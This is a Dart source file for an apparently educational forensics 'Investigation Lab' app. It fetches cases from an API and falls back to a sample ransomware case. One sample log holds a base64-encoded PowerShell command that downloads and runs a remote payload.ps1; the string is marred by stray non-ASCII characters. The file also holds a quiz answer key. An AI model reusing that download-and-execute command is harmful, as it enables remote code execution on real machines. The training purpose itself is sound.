import '../../../../core/network/api_client.dart';
import '../models/case_model.dart';
import '../models/evidence_model.dart';
import '../models/timeline_model.dart';
import '../models/verdict_model.dart';

/// Remote Data Source for Investigation Lab API endpoints.
class InvestigationRemoteDataSource {
  final ApiClient _apiClient;

  const InvestigationRemoteDataSource(this._apiClient);

  /// Fetches cases from API endpoint with filters & search query.
  Future<List<CaseModel>> getCases({
    String? statusFilter,
    String? priorityFilter,
    String? searchQuery,
    String? sortBy,
  }) async {
    try {
      final response = await _apiClient.get<List<dynamic>>(
        '/investigation/cases',
        queryParameters: {
          if (statusFilter != null && statusFilter != 'All')
            'status': statusFilter,
          if (priorityFilter != null && priorityFilter != 'All')
            'priority': priorityFilter,
          if (searchQuery != null && searchQuery.isNotEmpty) 'q': searchQuery,
          ...?sortBy == null ? null : {'sort': sortBy},
        },
      );
      if (response.data != null) {
        return response.data!
            .map((e) => CaseModel.fromJson(e as Map<String, dynamic>))
            .toList();
      }
    } catch (_) {
      // API fallback
    }
    return _getFallbackCases(
      statusFilter: statusFilter,
      priorityFilter: priorityFilter,
      searchQuery: searchQuery,
    );
  }

  /// Fetches case details by ID.
  Future<CaseModel> getCaseDetail(String caseId) async {
    try {
      final response = await _apiClient.get<Map<String, dynamic>>(
        '/investigation/cases/$caseId',
      );
      if (response.data != null) {
        return CaseModel.fromJson(response.data!);
      }
    } catch (_) {
      // API fallback
    }
    final all = _getFallbackCases();
    return all.firstWhere((c) => c.id == caseId, orElse: () => all.first);
  }

  /// Fetches single evidence item details.
  Future<EvidenceModel> getEvidence(String evidenceId) async {
    try {
      final response = await _apiClient.get<Map<String, dynamic>>(
        '/investigation/evidence/$evidenceId',
      );
      if (response.data != null) {
        return EvidenceModel.fromJson(response.data!);
      }
    } catch (_) {
      // Fallback
    }
    final caseDetail = await getCaseDetail('case_101');
    final found = caseDetail.evidenceList
        .firstWhere((e) => e.id == evidenceId, orElse: () => _fallbackEvidence.first);
    return found as EvidenceModel;
  }

  /// Submits verdict decision.
  Future<int> submitVerdict({
    required String caseId,
    required int selectedVerdictIndex,
  }) async {
    try {
      final response = await _apiClient.post<Map<String, dynamic>>(
        '/investigation/cases/$caseId/verdict',
        data: {'selected_verdict_index': selectedVerdictIndex},
      );
      if (response.data != null && response.data!['score'] != null) {
        return response.data!['score'] as int;
      }
    } catch (_) {
      // Fallback score
    }
    return selectedVerdictIndex == 1 ? 100 : 40;
  }

  static const List<EvidenceModel> _fallbackEvidence = [
    EvidenceModel(
      id: 'ev_001',
      title: 'Suspicious PowerShell Command Log',
      type: 'log',
      contentText:
          '2026-07-24 14:02:11 UTC - EventID: 4688\nProcess: powershell.exe -e aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHหมAADEAJwApAA==',
      metadataMap: {
        'Source': 'Windows Event Log (Security)',
        'Event ID': '4688',
        'User': 'SYSTEM / Administrator',
        'Computer': 'NOVACORP-DC01',
        'Execution Time': '2026-07-24 14:02:11 UTC',
      },
      isReviewed: true,
      timestamp: '2026-07-24 14:02 UTC',
    ),
    EvidenceModel(
      id: 'ev_002',
      title: 'Phishing Email Envelope Headers',
      type: 'email',
      contentText:
          'From: CFO Security Alert <alert@payro1l-novacorp.com>\nTo: finance-dept@novacorp.com\nSubject: URGENT: Mandatory Password Verification Required\nDate: Fri, 24 Jul 2026 13:45:00 +0000\nReceived: from mail.payro1l-novacorp.com (198.51.100.42)',
      metadataMap: {
        'Sender IP': '198.51.100.42',
        'SPF Result': 'SoftFail',
        'DKIM Signature': 'Invalid / Spoofed Domain',
        'Target': 'finance-dept@novacorp.com',
      },
      isReviewed: true,
      timestamp: '2026-07-24 13:45 UTC',
    ),
    EvidenceModel(
      id: 'ev_003',
      title: 'Browser History Dump - Chrome',
      type: 'history',
      contentText:
          '1. http://payro1l-novacorp.com/login.php?user=m.smith [POST 200]\n2. http://192.168.1.100/payload.ps1 [GET 200]\n3. https://internal.novacorp.com/finance/db_backup.sql [GET 200]',
      metadataMap: {
        'Browser': 'Google Chrome 126.0',
        'User Profile': 'm.smith',
        'Host PC': 'FINANCE-PC04',
      },
      isReviewed: false,
      timestamp: '2026-07-24 14:05 UTC',
    ),
    EvidenceModel(
      id: 'ev_004',
      title: 'Compromised Memory Artifact Screenshot',
      type: 'image',
      fileUrl: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5',
      contentText: 'Memory dump region showing unbacked RWX memory page.',
      metadataMap: {
        'Tool': 'Volatility 3 malfind',
        'VAD Base': '0x02a40000',
        'Permissions': 'PAGE_EXECUTE_READWRITE',
      },
      isReviewed: false,
      timestamp: '2026-07-24 14:15 UTC',
    ),
  ];

  static List<CaseModel> _getFallbackCases({
    String? statusFilter,
    String? priorityFilter,
    String? searchQuery,
  }) {
    final cases = [
      CaseModel(
        id: 'case_101',
        caseCode: '#FSC-0091',
        title: 'Ransomware Intrusion: NovaCorp Inc.',
        description:
            'Investigate an active ransomware breach at NovaCorp Inc. Determine the initial access vector, lateral movement techniques, C2 server IP address, and main suspect.',
        priority: 'Critical',
        difficulty: 'Intermediate',
        status: 'In Progress',
        assignedDate: '2026-07-24',
        progress: 0.65,
        evidenceList: _fallbackEvidence,
        timeline: const [
          TimelineEventModel(
            id: 'tl_1',
            title: 'Spear Phishing Email Delivered',
            description: 'Spoofed email received from payro1l-novacorp.com.',
            timestamp: '13:45 UTC',
            category: 'Initial Access',
            severity: 'Medium',
            isExpanded: true,
          ),
          TimelineEventModel(
            id: 'tl_2',
            title: 'User Executed Malicious Link',
            description: 'Credential harvesting page accessed on FINANCE-PC04.',
            timestamp: '13:58 UTC',
            category: 'Execution',
            severity: 'High',
            isExpanded: false,
          ),
          TimelineEventModel(
            id: 'tl_3',
            title: 'Encoded PowerShell Beacon Downloaded',
            description: 'Payload fetched from 192.168.1.100.',
            timestamp: '14:02 UTC',
            category: 'Command & Control',
            severity: 'Critical',
            isExpanded: false,
          ),
        ],
        suspects: const [
          SuspectModel(
            id: 's1',
            name: 'APT-29 (Cozy Bear Affiliate)',
            role: 'External Threat Actor',
            avatarUrl: '',
            ipAddress: '198.51.100.42',
            status: 'Primary Suspect',
          ),
          SuspectModel(
            id: 's2',
            name: 'Insider Threat: Mark Smith',
            role: 'Finance Employee (Victim)',
            avatarUrl: '',
            ipAddress: '192.168.1.45',
            status: 'Cleared / Victim',
          ),
        ],
        notes:
          'Key Finding: Initial access was achieved via domain typo-squatting payro1l-novacorp.com, followed by PowerShell base64 encoded stager download.',
        objectives: const [
          'Examine phishing email header domain',
          'Decode base64 PowerShell command',
          'Identify C2 server IP address',
          'Formulate final verdict report',
        ],
        verdict: const VerdictModel(
          id: 'v_101',
          caseId: 'case_101',
          summaryText:
              'Based on your digital evidence analysis, identify the primary root cause and attack vector of the NovaCorp breach.',
          options: [
            'Unpatched RDP vulnerability on Domain Controller',
            'Spear Phishing via domain typosquatting (payro1l-novacorp.com) executing encoded PowerShell stager',
            'Malicious USB key inserted into Finance Workstation',
            'SQL Injection on public web application',
          ],
          correctOptionIndex: 1,
          explanationText:
              'Correct! The attacker used typosquatting (payro1l-novacorp.com) to phish credentials and trick the user into executing a base64 encoded PowerShell beacon.',
          xpReward: 500,
        ),
      ),
      const CaseModel(
        id: 'case_102',
        caseCode: '#FSC-0084',
        title: 'Exfiltration via Compromised Cloud Storage',
        description:
            'Analyze S3 bucket access logs to trace unauthorized data exfiltration of customer PII records.',
        priority: 'High',
        difficulty: 'Advanced',
        status: 'Open',
        assignedDate: '2026-07-22',
        progress: 0.0,
        evidenceList: [],
        timeline: [],
        suspects: [],
        notes: '',
        objectives: ['Analyze AWS CloudTrail logs', 'Identify unauthorized IAM key usage'],
      ),
    ];

    return cases.where((c) {
      if (statusFilter != null && statusFilter != 'All' && c.status != statusFilter) {
        return false;
      }
      if (priorityFilter != null &&
          priorityFilter != 'All' &&
          c.priority != priorityFilter) {
        return false;
      }
      if (searchQuery != null && searchQuery.isNotEmpty) {
        final q = searchQuery.toLowerCase();
        return c.title.toLowerCase().contains(q) ||
            c.caseCode.toLowerCase().contains(q);
      }
      return true;
    }).toList();
  }
}
